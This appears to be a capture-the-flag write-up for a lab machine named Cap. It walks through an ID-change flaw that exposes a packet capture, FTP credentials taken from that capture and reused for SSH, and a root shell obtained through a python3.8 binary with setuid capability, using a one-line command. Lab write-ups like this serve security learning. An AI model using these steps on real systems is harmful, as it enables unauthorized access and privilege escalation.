# Machine: Cap (Linux - Easy)

## 1. Recon
- Service enumeration
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```
- Try access the web, showing security dashboard page
- Go to **Security Snapshot** page
- Observe **id** in URL
- Change **id** to `0`
- Download
- Open pcap file
- Filter **ftp** traffic
- Observe USER and PASS for FTP service

## 2. Initial access
- Try login to FTP with the credentials
- Try login to SSH with the same credentials
- Ok

## 3. Privilege Escalation
- Download linpeas
- Run
- A lot of output, but there is one interesting thing. `python3.8` with setuid capabilities
- What's mean? this program can change its own UID value
```
...
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
...
```
- Exploitation, change UID to 0 (root):
```
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```
- Pwned!
